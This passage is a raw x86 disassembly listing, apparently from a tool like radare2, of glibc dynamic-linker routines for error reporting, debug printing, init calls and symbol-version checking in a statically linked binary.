lea esi, [esi]
lea edi, [edi]
push eax
push ecx
push edx
mov edx, dword [var_4h_2]
mov eax, dword [var_ch_3]
call fcn.08080f30
pop edx
pop ecx
xchg dword [esp], eax
ret 8
nop
lea esi, [esi]
push eax
push ecx
push edx
mov ecx, dword [esp + 0x14]
mov edx, dword [esp + 0x10]
mov eax, dword [esp + 0xc]
call fcn.08081050
pop edx
pop ecx
xchg dword [esp], eax
ret 8
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, ecx
push ebx
sub esp, 0x44c
mov ebx, dword [arg_8h]
mov dword [var_41ch], eax
mov eax, str.DYNAMIC_LINKER_BUG___
test ebx, ebx
cmovne eax, dword [arg_8h]
mov dword [arg_8h], eax
call dword [0x80a9c20]
test edi, edi
mov ebx, dword [eax]
mov eax, 0x80a4f11
cmove edi, eax
test ebx, ebx
je 0x80812d5
mov dword [esp], edi
call fcn.08053400
inc eax
mov dword [var_420h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov eax, dword [var_420h]
add eax, esi
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [ebx + 4], eax
je 0x80812c6
mov edx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edx
mov eax, dword [ebx + 4]
mov dword [esp], eax
call fcn.08053740
mov dword [var_4h], edi
mov edx, dword [var_420h]
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.08053770
mov dword [ebx], eax
mov ecx, dword [var_41ch]
mov eax, 0xffffffff
test ecx, ecx
cmovne eax, dword [var_41ch]
mov dword [var_4h], eax
lea eax, [ebx + 8]
mov dword [esp], eax
call fcn.08084a80
mov dword [ebx], 0x80a4f11
mov dword [ebx + 4], 0x80a467e
jmp 0x80812a3
mov edx, dword [var_41ch]
mov eax, 0x80a4f11
test edx, edx
jne 0x808135b
mov dword [var_20h], eax
mov edx, 0x8092923
mov ecx, 0x80a4f11
mov eax, dword [var_41ch]
test eax, eax
mov eax, edx
cmove eax, ecx
mov dword [var_1ch], eax
mov eax, dword [arg_8h]
mov dword [var_18h], eax
mov eax, str.error_while_loading_shared_libraries
cmp byte [edi], 0
mov dword [var_10h], edi
cmove edx, ecx
test esi, esi
cmovne eax, esi
mov dword [var_14h], edx
mov dword [var_ch], eax
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], 2
mov dword [var_4h], str._s:__s:__s_s_s_s_s_n
mov eax, str._program_name_unknown_
test edx, edx
cmovne eax, edx
mov dword [var_8h], eax
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
lea eax, [var_418h]
mov dword [var_8h], 0x400
mov dword [var_4h], eax
mov eax, dword [var_41ch]
mov dword [esp], eax
call fcn.08053300
jmp 0x80812e4
push ebp
mov ebp, esp
sub esp, 0x28
test dword [0x80aac10], 0xfffffd7f
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, edx
mov dword [var_10h], ecx
mov esi, dword [arg_8h]
mov edi, eax
jne 0x80813c8
mov eax, dword [0x80aaa0c]
test eax, eax
je 0x80813fa
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], ebx
mov dword [esp], edi
call eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov edi, dword [var_4h_2]
leave
ret 4
mov eax, dword [0x80aaa0c]
mov edx, str.continued
mov dword [var_sp_ch], esi
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], ebx
mov dword [esp], str._s:_error:__s:__s___s__n
test eax, eax
mov eax, str.fatal
cmove edx, eax
mov dword [var_sp_10h], edx
call fcn.08081c40
jmp 0x80813a5
mov ecx, dword [var_10h]
mov edx, ebx
mov eax, edi
mov dword [esp], esi
call fcn.08081200
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xf8
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_dch], eax
mov dword [var_e0h], edx
mov dword [var_e4h], ecx
mov dword [var_d4h], 0
call dword [0x80a9c20]
mov dword [var_e8h], eax
mov eax, dword [eax]
mov dword [var_1ch], eax
lea eax, [var_d0h]
mov dword [esp], eax
call fcn.08084a40
test eax, eax
mov edx, eax
jne 0x80814af
mov ecx, dword [var_e8h]
lea eax, [var_d8h]
mov dword [ecx], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [var_e4h]
mov eax, dword [var_1ch]
mov edx, dword [var_e8h]
mov ecx, dword [var_dch]
mov dword [edx], eax
mov eax, dword [var_e0h]
mov dword [ecx], 0
mov dword [eax], 0
xor eax, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret 4
mov eax, dword [var_1ch]
mov ecx, dword [var_e8h]
mov dword [ecx], eax
mov ecx, dword [var_dch]
mov eax, dword [var_d8h]
mov dword [ecx], eax
mov ecx, dword [var_e0h]
mov eax, dword [var_d4h]
mov dword [ecx], eax
xor eax, eax
cmp edx, 0xffffffff
cmovne eax, edx
jmp 0x80814a2
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_14h], edx
mov dword [var_18h], ecx
mov dword [var_10h], eax
call dword [0x80a9c20]
mov edi, dword [0x80aaa0c]
mov esi, dword [eax]
mov ebx, eax
mov dword [eax], 0
mov eax, dword [var_10h]
mov dword [0x80aaa0c], eax
mov eax, dword [var_18h]
mov dword [esp], eax
call dword [var_14h]
mov dword [ebx], esi
mov dword [0x80aaa0c], edi
mov esi, dword [var_8h]
mov ebx, dword [var_ch]
mov edi, dword [var_4h]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
movzx eax, byte [ebx + 0x174]
test al, 8
jne 0x8081584
mov edx, eax
mov eax, dword [ebx + 4]
or edx, 8
mov byte [ebx + 0x174], dl
movzx ecx, byte [eax]
test cl, cl
je 0x808161e
mov edx, dword [ebx + 0x48]
test edx, edx
jne 0x808158f
mov esi, dword [ebx + 0x7c]
test esi, esi
jne 0x808158f
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
test byte [0x80aac10], 2
jne 0x80815fb
test edx, edx
jne 0x80815de
mov edx, dword [ebx + 0x7c]
test edx, edx
je 0x8081584
mov eax, dword [ebx + 0x84]
mov edi, dword [ebx]
xor ebx, ebx
add edi, dword [edx + 4]
mov esi, dword [eax + 4]
shr esi, 2
cmp ebx, esi
jae 0x8081584
lea esi, [esi]
mov eax, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], edx
mov eax, dword [arg_ch]
mov dword [esp], eax
call dword [edi + ebx*4]
inc ebx
cmp ebx, esi
jb 0x80815c0
jmp 0x8081584
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
add eax, dword [ebx]
mov dword [var_sp_8h], edx
mov edx, dword [arg_10h]
mov dword [var_sp_4h], edx
mov edx, dword [arg_ch]
mov dword [esp], edx
call eax
jmp 0x808159c
test cl, cl
jne 0x8081606
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_sp_4h], eax
mov dword [esp], str._ncalling_init:__s_n_n
call fcn.08081c40
mov edx, dword [ebx + 0x48]
jmp 0x8081598
and edx, 3
test dl, dl
je 0x8081584
jmp 0x8081576
mov esi, esi
push ebp
mov ebp, esp
push edi
mov edi, ecx
push esi
mov esi, eax
push ebx
sub esp, 0x2c
mov ebx, dword [esi + 0x9c]
mov eax, dword [eax + 0x98]
mov dword [var_10h], edx
mov dword [var_14h], eax
mov eax, dword [0x80aac64]
test eax, eax
jne 0x8081747
mov eax, dword [var_14h]
test eax, eax
jne 0x80816cb
xor eax, eax
call fcn.08081770
mov dword [eax + 0xc], 1
mov dword [var_18h], eax
call fcn.080817b0
mov ebx, dword [esi + 0x154]
mov eax, ebx
dec ebx
test eax, eax
jne 0x808169f
mov eax, dword [var_18h]
mov dword [eax + 0xc], 0
call fcn.080817b0
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [arg_8h]
mov edx, dword [var_10h]
mov dword [var_8h], edi
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [esi + 0x1d8]
mov eax, dword [eax + ebx*4]
mov dword [esp], eax
call fcn.08081540
mov eax, ebx
dec ebx
test eax, eax
jne 0x808169f
jmp 0x8081686
test ebx, ebx
je 0x8081663
mov eax, dword [ebx + 4]
mov ebx, eax
shr ebx, 2
je 0x8081663
test byte [0x80aac10], 2
jne 0x8081726
mov edx, dword [var_14h]
mov eax, dword [esi]
mov edx, dword [edx + 4]
mov dword [var_20h], 0
add eax, edx
cmp dword [var_20h], ebx
mov dword [var_1ch], eax
jae 0x8081663
mov eax, dword [arg_8h]
mov edx, dword [var_10h]
mov dword [var_4h], edi
mov dword [var_8h], eax
mov dword [esp], edx
mov eax, dword [var_20h]
mov edx, dword [var_1ch]
call dword [edx + eax*4]
inc dword [var_20h]
cmp dword [var_20h], ebx
jb 0x80816ff
jmp 0x8081663
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x8081735
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str._ncalling_preinit:__s_n_n
call fcn.08081c40
jmp 0x80816e2
mov edx, dword [arg_8h]
mov dword [var_8h], ecx
mov dword [esp], eax
mov dword [var_ch], edx
mov edx, dword [var_10h]
mov dword [var_4h], edx
call fcn.08081540
mov dword [0x80aac64], 0
jmp 0x808165c
mov edx, dword [0x80aad38]
push ebp
mov ebp, esp
test edx, edx
jne 0x80817a0
mov dword [0x80aad40], eax
mov dword [0x80aad30], 1
mov dword [0x80aad38], 0x80817b0
mov eax, dword [0x80aac58]
mov dword [0x80aad34], eax
mov eax, 0x80aad30
leave
ret
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x88
mov dword [var_4h], 0
mov dword [esp], eax
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_bp_4h], edi
mov dword [var_70h], 0xffffffff
mov esi, edx
mov edi, ecx
call fcn.08053ec0
test eax, eax
mov ebx, eax
js 0x808181f
lea eax, [var_6ch]
mov dword [var_4h], ebx
mov dword [esp], 3
mov dword [var_sp_8h], eax
call fcn.08053dc0
test eax, eax
js 0x8081817
mov eax, dword [var_40h]
test eax, eax
mov dword [esi], eax
jne 0x808182d
mov dword [esp], ebx
call fcn.08053f20
mov eax, dword [var_70h]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov dword [var_14h], 0
mov dword [var_10h], ebx
mov dword [var_sp_ch], 2
mov dword [var_sp_8h], edi
mov dword [var_4h], eax
mov dword [esp], 0
call fcn.080546d0
mov dword [var_70h], eax
jmp 0x8081817
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x23c
mov dword [var_220h], 0
mov esi, dword [arg_10h]
movzx ebx, byte [esi]
test bl, bl
je 0x808193c
mov eax, dword [arg_ch]
mov dword [var_224h], esi
test eax, eax
jle 0x80818cd
mov ecx, dword [var_220h]
test ecx, ecx
je 0x8081bb4
cmp edi, 0x3f
jg 0x8081ba2
lea eax, [var_21ch]
mov dword [ebp + edi*8 - 0x208], 0xc
mov dword [arg_ch], 0xffffffff
mov dword [ebp + edi*8 - 0x20c], eax
movzx ebx, byte [esi]
inc edi
test bl, bl
je 0x8081900
cmp bl, 0x25
je 0x8081900
mov edx, dword [arg_ch]
test edx, edx
jne 0x8081b94
inc esi
movzx ebx, byte [esi]
test bl, bl
je 0x8081900
cmp bl, 0x25
je 0x8081900
mov eax, dword [arg_ch]
test eax, eax
je 0x80818e1
cmp bl, 0xa
jne 0x80818e1
lea esi, [esi]
cmp edi, 0x3f
jg 0x8081b70
mov eax, esi
sub eax, dword [var_224h]
test eax, eax
mov dword [ebp + edi*8 - 0x208], eax
je 0x808192a
mov edx, dword [var_224h]
mov dword [ebp + edi*8 - 0x20c], edx
inc edi
cmp bl, 0x25
je 0x8081987
cmp bl, 0xa
je 0x8081956
test bl, bl
jne 0x8081886
lea ecx, [var_20ch]
mov ebx, dword [arg_8h]
mov edx, edi
mov eax, 0x92
int 0x80
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cmp esi, dword [var_224h]
je 0x8081972
inc dword [ebp + edi*8 - 0x210]
mov dword [arg_ch], 1
inc esi
movzx ebx, byte [esi]
jmp 0x8081934
mov dword [ebp + edi*8 - 0x20c], esi
mov dword [ebp + edi*8 - 0x208], 1
inc edi
jmp 0x8081965
inc esi
mov byte [var_225h], 0x20
mov dword [var_22ch], 0xffffffff
mov dword [var_230h], 0xffffffff
movzx ebx, byte [esi]
cmp bl, 0x30
je 0x8081b60
cmp bl, 0x2a
je 0x8081b48
cmp bl, 0x2e
je 0x8081b24
cmp bl, 0x6c
je 0x8081b1b
cmp bl, 0x5a
je 0x8081b1b
movsx eax, bl
cmp eax, 0x75
je 0x8081a7f
jg 0x8081a76
cmp eax, 0x25
je 0x8081a62
cmp eax, 0x73
je 0x8081a20
mov eax, str.invalid_format_specifier
test eax, eax
je 0x808196c
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0xe3
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.___invalid_format_specifier_
call fcn.0805efc0
mov eax, dword [arg_14h]
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [ebp + edi*8 - 0x20c], eax
mov dword [esp], eax
call fcn.08053400
cmp dword [var_230h], 0xffffffff
mov dword [ebp + edi*8 - 0x208], eax
je 0x8081a5c
cmp eax, dword [var_230h]
cmova eax, dword [var_230h]
mov dword [ebp + edi*8 - 0x208], eax
inc edi
jmp 0x808196c
mov dword [ebp + edi*8 - 0x20c], esi
mov dword [ebp + edi*8 - 0x208], 1
jmp 0x8081a5c
cmp eax, 0x78
jne 0x80819ef
mov eax, dword [arg_14h]
sub esp, 0x1c
mov edx, 0x10
add dword [arg_14h], 4
mov ecx, dword [eax]
mov dword [var_4h_2], 0
mov dword [var_10h], 0
lea eax, [var_4h]
or eax, 0xc
cmp bl, 0x78
mov dword [var_234h], eax
mov dword [esp], ecx
mov eax, 0xa
cmovne edx, eax
mov dword [esp + 0xc], edx
mov edx, dword [var_234h]
mov dword [var_8h_2], edx
call fcn.08063ca0
cmp dword [var_22ch], 0xffffffff
mov edx, eax
je 0x8081b03
mov eax, dword [var_234h]
sub eax, edx
cmp eax, dword [var_22ch]
jge 0x8081b03
movzx ebx, byte [var_225h]
dec edx
mov byte [edx], bl
mov eax, dword [var_234h]
sub eax, edx
cmp eax, dword [var_22ch]
jl 0x8081ae9
sub dword [var_234h], edx
mov dword [ebp + edi*8 - 0x20c], edx
mov eax, dword [var_234h]
jmp 0x8081a55
inc esi
movzx ebx, byte [esi]
jmp 0x80819d3
cmp byte [esi + 1], 0x2a
jne 0x80819c1
mov eax, dword [arg_14h]
add esi, 2
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [var_230h], eax
movzx ebx, byte [esi]
jmp 0x80819c1
mov eax, dword [arg_14h]
inc esi
add dword [arg_14h], 4
mov eax, dword [eax]
mov dword [var_22ch], eax
movzx ebx, byte [esi]
jmp 0x80819b8
inc esi
mov byte [var_225h], 0x30
movzx ebx, byte [esi]
jmp 0x80819af
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x83
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.niov___64
jmp 0x8081a1b
cmp bl, 0xa
jne 0x80818e1
jmp 0x8081900
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x76
jmp 0x8081b80
call fcn.08053db0
test eax, eax
mov dword [var_220h], eax
js 0x8081c1b
lea eax, [var_212h]
mov dword [var_10h_2], 0
mov dword [var_sp_ch], 0xa
mov dword [var_8h], eax
lea ebx, [var_21ch]
mov eax, dword [var_220h]
cdq
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08063ca0
cmp eax, ebx
jbe 0x8081c08
lea esi, [esi]
dec eax
cmp eax, ebx
mov byte [eax], 0x20
ja 0x8081c00
mov byte [var_212h], 0x3a
mov byte [var_211h], 9
jmp 0x80818a1
mov dword [var_sp_ch], str._dl_debug_vdprintf
mov dword [var_8h], 0x6d
mov dword [var_4h], str.dl_misc.c
mov dword [esp], str.pid___0__sizeof__pid_t____4
jmp 0x8081a1b
nop
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_ch]
mov dword [var_4h], 1
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_8h], eax
mov eax, dword [0x80a95c0]
mov dword [esp], eax
call fcn.08081860
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_ch]
mov dword [var_4h], 0xffffffff
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_8h], eax
mov eax, dword [0x80a95c0]
mov dword [esp], eax
call fcn.08081860
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_10h]
mov dword [var_4h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08081860
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push esi
mov esi, eax
push ebx
mov ebx, edx
sub esp, 8
mov eax, dword [edx + 4]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
mov edx, 1
test eax, eax
je 0x8081d20
mov ebx, dword [ebx + 0x14]
test ebx, ebx
je 0x8081d1e
nop
lea esi, [esi]
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
mov edx, 1
test eax, eax
je 0x8081d20
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x8081d00
xor edx, edx
add esp, 8
mov eax, edx
pop ebx
pop esi
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, edx
push esi
mov esi, ecx
push ebx
sub esp, 0xb0
test byte [0x80aac10], 0x10
mov edx, dword [arg_8h]
mov dword [var_a0h], eax
mov eax, dword [edx + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_a8h], 0
mov dword [var_a4h], eax
jne 0x8082034
mov edx, dword [arg_8h]
mov eax, dword [edx + 0xac]
test eax, eax
je 0x8081fc3
mov eax, dword [eax + 4]
test eax, eax
je 0x8082066
mov edx, dword [var_4h]
mov ebx, dword [edx]
add ebx, eax
cmp word [ebx], 1
jne 0x8081f29
cmp edi, dword [ebx + 8]
je 0x8081f01
mov eax, dword [ebx + 0x10]
test eax, eax
jne 0x8081d9d
mov edx, dword [var_ch]
test edx, edx
je 0x8081e71
mov eax, dword [var_8h]
xor edx, edx
test eax, eax
jne 0x8081ddc
lea esi, [esi]
lea esp, [var_bp_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret 0xc
mov eax, dword [var_a0h_2]
mov dword [var_78h], esi
mov dword [var_7ch], str.weak_version__
mov dword [var_74h], str._not_found__required_by_
mov dword [var_6ch], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_70h], eax
mov eax, dword [ebp + ebx*4 - 0x7c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 4
jbe 0x8081e04
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x7c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 4
mov edx, eax
mov ecx, esi
jbe 0x8081e2b
mov eax, dword [arg_8h]
mov edx, dword [eax + 4]
cmp byte [edx], 0
jne 0x8081e57
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], ecx
xor eax, eax
xor ecx, ecx
call fcn.08081380
sub esp, 4
mov edx, dword [var_a8h]
jmp 0x8081dd0
mov edx, dword [var_a0h_2]
mov dword [var_98h], esi
mov dword [var_9ch], 0x80a47b5
mov dword [var_94h], str._not_found__required_by_
mov dword [var_8ch], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_90h], edx
mov eax, dword [ebp + ebx*4 - 0x9c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 4
jbe 0x8081ea8
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x9c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 4
mov edx, eax
jbe 0x8081ed2
lea esi, [esi]
mov ecx, esi
mov dword [var_a8h_2], 1
jmp 0x8081e45
mov eax, ebx
mov edx, dword [var_a4h_2]
add eax, dword [ebx + 0xc]
add edx, dword [eax]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08076e50
xor edx, edx
test eax, eax
je 0x8081dd0
jmp 0x8081db2
lea eax, [var_29h]
mov byte [var_29h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0xa
mov dword [var_8h], eax
mov dword [var_5ch], str.unsupported_version_
movzx eax, word [ebx]
mov esi, 1
xor ebx, ebx
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08063ca0
mov dword [var_44h], str._of_Verdef_record
mov edx, dword [var_5ch]
mov dword [var_58h], eax
mov dword [var_54h], str._of_Verdef_record
mov dword [var_48h], eax
mov dword [var_4ch], edx
mov eax, dword [ebp + ebx*4 - 0x4c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x8081f7f
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x4c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
jbe 0x8081fa6
jmp 0x8081ef0
mov ecx, dword [arg_ch]
xor edx, edx
test ecx, ecx
je 0x8081dd0
mov eax, dword [var_a0h]
mov dword [var_1ch], str.no_version_information_available__required_by_
mov dword [var_14h], 0x8092e9e
mov esi, 1
xor ebx, ebx
mov dword [var_18h], eax
mov eax, dword [ebp + ebx*4 - 0x1c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x8081fee
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x1c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
mov ecx, esi
jbe 0x8082015
jmp 0x8081e45
mov eax, dword [var_a0h]
mov dword [var_ch], eax
mov eax, dword [edx + 4]
cmp byte [eax], 0
jne 0x808204d
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov dword [var_4h], esi
mov dword [esp], str.checking_for_version___s_in_file__s_required_by_file__s_n
call fcn.08081c40
jmp 0x8081d7c
mov dword [var_ch], str.match_symbol
mov dword [var_8h], 0x70
mov dword [var_4h], str.dl_version.c
mov dword [esp], str.def_offset___0
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x78
mov dword [var_6ch], 0
mov dword [var_5ch], 0
mov dword [var_50h], eax
mov dword [var_54h], edx
mov dword [var_58h], ecx
mov eax, dword [eax + 0x2c]
xor edx, edx
test eax, eax
je 0x80821fc
mov eax, dword [eax + 4]
mov ecx, dword [var_50h]
mov dword [var_60h], eax
mov ecx, dword [ecx + 0xa4]
mov eax, dword [var_50h]
mov eax, dword [eax + 0xac]
test ecx, ecx
mov dword [var_64h], ecx
mov dword [var_68h], eax
je 0x80821c2
mov edx, dword [ecx + 4]
mov ecx, dword [var_50h_2]
mov ecx, dword [ecx]
add edx, ecx
cmp word [edx], 1
mov dword [var_70h_2], edx
jne 0x8082385
lea esi, [esi]
mov edx, dword [var_70h]
mov ebx, dword [0x80aac58]
mov esi, dword [var_60h]
add esi, dword [edx + 4]
test ebx, ebx
je 0x8082129
mov edx, ebx
mov eax, esi
mov edi, ebx
call fcn.08081cd0
test eax, eax
jne 0x808213c
mov ebx, dword [ebx + 0xc]
test ebx, ebx
jne 0x8082113
mov ecx, dword [var_50h]
xor ebx, ebx
cmp ebx, dword [ecx + 0x154]
jb 0x808234c
xor edi, edi
test edi, edi
je 0x8082421
mov eax, dword [var_58h_2]
test eax, eax
jne 0x808233a
mov ebx, dword [var_70h_2]
add ebx, dword [ebx + 8]
mov edx, dword [var_50h_2]
mov ecx, dword [var_60h_2]
add ecx, dword [ebx + 8]
mov eax, dword [edx + 4]
cmp byte [eax], 0
je 0x808232e
mov esi, eax
movzx eax, word [ebx + 4]
mov dword [esp], edi
and eax, 2
mov dword [var_8h], eax
mov eax, dword [var_54h]
mov dword [var_4h], eax
mov eax, esi
mov edx, dword [ebx]
call fcn.08081d40
or dword [var_5ch], eax
sub esp, 0xc
movzx eax, word [ebx + 6]
and eax, 0x7fff
cmp eax, dword [var_6ch]
cmovbe eax, dword [var_6ch]
mov dword [var_6ch], eax
mov eax, dword [ebx + 0xc]
test eax, eax
je 0x80821ae
add ebx, eax
jmp 0x8082155
mov edx, dword [var_70h]
mov eax, dword [edx + 0xc]
test eax, eax
je 0x80821c2
add edx, eax
mov dword [var_70h], edx
jmp 0x8082100
mov eax, dword [var_68h]
test eax, eax
je 0x80821f2
mov ecx, dword [var_68h_2]
mov eax, dword [var_50h_2]
mov edx, dword [ecx + 4]
add edx, dword [eax]
movzx eax, word [edx + 4]
and eax, 0x7fff
cmp eax, dword [var_6ch_2]
cmovbe eax, dword [var_6ch_2]
mov dword [var_6ch_2], eax
mov eax, dword [edx + 0x10]
test eax, eax
je 0x80821f2
add edx, eax
jmp 0x80821d4
mov edi, dword [var_6ch]
test edi, edi
jne 0x8082206
mov edx, dword [var_5ch_2]
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [var_6ch]
mov dword [var_4h], 0x10
inc ebx
mov dword [esp], ebx
call fcn.08051730
mov ecx, dword [var_50h]
test eax, eax
mov edx, eax
mov dword [ecx + 0x17c], eax
je 0x8082306
mov eax, dword [var_50h_2]
mov esi, dword [var_64h_2]
mov ecx, eax
mov dword [eax + 0x178], ebx
test esi, esi
mov eax, dword [eax + 0xdc]
mov eax, dword [eax + 4]
mov dword [ecx + 0x18c], eax
je 0x80822a8
mov eax, dword [var_64h_2]
mov esi, edx
mov edi, dword [eax + 4]
add edi, dword [ecx]
mov ebx, edi
add ebx, dword [edi + 8]
lea esi, [esi]
movzx edx, word [ebx + 6]
mov eax, dword [ebx]
mov ecx, edx
and edx, 0x8000
and ecx, 0x7fff
shl ecx, 4
mov dword [esi + ecx + 4], eax
mov dword [esi + ecx + 8], edx
mov eax, dword [var_60h_2]
add eax, dword [ebx + 8]
mov dword [esi + ecx], eax
mov eax, dword [var_60h_2]
add eax, dword [edi + 4]
mov dword [esi + ecx + 0xc], eax
mov eax, dword [ebx + 0xc]
test eax, eax
je 0x808229d
add ebx, eax
jmp 0x8082260
mov eax, dword [edi + 0xc]
test eax, eax
je 0x80822a8
add edi, eax
jmp 0x8082258
mov ebx, dword [var_68h_2]
test ebx, ebx
je 0x80821f9
mov edx, dword [var_68h_2]
mov ecx, dword [var_50h_2]
mov ebx, dword [edx + 4]
add ebx, dword [ecx]
mov esi, ebx
add esi, dword [ebx + 0xc]
test byte [ebx + 2], 1
jne 0x80822f7
movzx eax, word [ebx + 4]
mov edx, dword [var_50h_2]
mov ecx, dword [edx + 0x17c]
mov edx, dword [ebx + 8]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
mov dword [ecx + eax + 4], edx
mov dword [ecx + eax + 0xc], 0
mov edx, dword [var_60h_2]
add edx, dword [esi]
mov dword [ecx + eax], edx
mov eax, dword [ebx + 0x10]
test eax, eax
je 0x80821f9
add ebx, eax
jmp 0x80822be
mov ecx, str.cannot_allocate_version_reference_table
mov edi, 0xc
mov eax, dword [var_50h]
mov edx, dword [eax + 4]
cmp byte [edx], 0
jne 0x8082322
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], ecx
mov eax, edi
xor ecx, ecx
call fcn.08081200
mov eax, dword [0x80a95a8]
mov esi, dword [eax]
jmp 0x808216c
test byte [edi + 0x175], 2
je 0x808214f
jmp 0x80821ae
mov edx, dword [var_50h]
mov eax, dword [edx + 0x150]
mov edx, dword [eax + ebx*4]
mov eax, esi
call fcn.08081cd0
test eax, eax
jne 0x8082374
